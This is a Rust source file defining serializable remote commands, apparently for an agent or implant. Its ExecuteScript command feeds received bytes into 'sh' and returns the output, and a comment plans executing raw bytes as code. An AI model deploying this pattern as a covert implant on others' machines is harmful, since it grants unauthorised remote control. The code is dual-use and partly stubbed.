use bincode::{*, config::Infinite};
use serde::{Serialize,Deserialize};

use std::{process::{self, Stdio, Command}, io::Write};


pub trait CommandType where Self: Serialize{
    fn execute(&self)->Vec<String>{
        return vec!["Debug!".to_string(), "Unimplemented!".to_string()];
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub enum CommandEnum {
    // Should contain every new command type.
    DebugCommand(DebugCommand),
    GetTelemetry(GetTelemetry),
    ExecuteScript(ExecuteScript),
    UpdateConfigs(UpdateConfigs),
    GetConfigs(GetConfigs),
}

impl CommandType for CommandEnum {
    fn execute(&self)->Vec<String> {
        match self {
            Self::DebugCommand(DebugCommand) => DebugCommand.execute(),
            Self::GetTelemetry(GetTelemetry) => GetTelemetry.execute(),
            Self::ExecuteScript(ExecuteScript) => ExecuteScript.execute(),
            Self::UpdateConfigs(UpdateConfigs) => UpdateConfigs.execute(),
            Self::GetConfigs(GetConfigs) => GetConfigs.execute(),
        }
    }
}

// Eventually probably move each command types to its own .rs file just for
// simpler organization.

// Eventually add the ability to use
// unsafe { mem::transmute(raw_bytes.as_ptr())} and get
// response. Name this something like executebinary, 
// executescript will use a sh script.
#[derive(Serialize, Deserialize, Debug)]
pub struct DebugCommand {

}

impl CommandType for DebugCommand {

}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetTelemetry {


}

impl CommandType for GetTelemetry {
    fn execute(&self)->Vec<String>{
        let pid = process::id();
        return vec!["PID".to_string(), pid.to_string()]
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ExecuteScript {
    pub(crate) script:Vec<u8>,
}

impl CommandType for ExecuteScript {
    fn execute(&self)->Vec<String>{
        let mut shell = Command::new("sh");

        shell.stdout(Stdio::piped());
        shell.stdin(Stdio::piped());

        let mut subprocess = shell.spawn()
                            .expect("Subprocess spawn failed.");
        

        let mut subprocess_stdin = subprocess.stdin.take()
                                                    .expect("STDIN take failed.");

        subprocess_stdin.write_all(&self.script)
                                .expect("stdin write failed.");
        drop(subprocess_stdin);

        let result = subprocess.wait_with_output()
                                        .expect("Script output failed.");
        
        let output = std::str::from_utf8(&result.stdout)
                                                .expect("stdout deserialization failed.");

        return vec!["Script Output".to_string(), output.to_string()]
    
    }

}

#[derive(Serialize, Deserialize, Debug)]
pub struct UpdateConfigs {

}

impl CommandType for UpdateConfigs {

}

#[derive(Serialize, Deserialize, Debug)]
pub struct GetConfigs {

}

impl CommandType for GetConfigs {

}
